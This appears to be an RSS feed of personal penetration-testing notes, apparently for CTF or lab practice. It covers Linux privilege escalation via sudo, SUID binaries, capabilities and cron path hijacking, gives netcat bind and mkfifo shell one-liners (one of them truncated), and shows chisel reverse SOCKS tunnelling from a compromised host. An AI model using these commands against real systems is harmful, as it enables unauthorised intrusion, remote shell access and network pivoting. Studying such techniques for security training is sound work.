channel.title: Notes on Docs
channel.description: Recent content in Notes on Docs

item.title: Privesc
item.description: SUDO use “sudo -l” to see what the user can use sudo on and use gtfo bins SUID find / -type f -perm -04000 -ls 2>/dev/null - finds suid files on machine use gtfo bins to abuse this Capabilities using “getcap -r / 2>/dev/null” you can list binaries that can use higher privileges then use gtfo bins Cronjobs look in the /etc/crontab file and look at what jobs are running if there is no full path you can create a script in one of the path locations create a rev shell script or exploit one of the binaries used in a script.

item.title: Shells
item.description: Netcat on compromised machine nc -lvnp PORT -e /bin/bash If previous doesn’t work use: mkfifo /tmp/f; nc -lvnp < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/ Stabalize a reverse shell python3 -c 'import pty;pty.spawn("/bin/bash")'; export TERM=xterm Ctrl Z + stty raw -echo; fg

item.title: Tunnelling
item.description: Chisel use webserver method to transfer files or use scp scp -i Key chisel user@target:/tmp/chisel has two modes server and client reverse SOCKS proxy set up listener on attaacking box ./chisel server -p listenPort –reverse & on the compromised host ./chisel client attackingIP:listenPort R:socks & port for sending data back through the proxy will be different forward SOCKS proxy on compromised host ./chisel server -p listenPort –socks5 on attacking box .
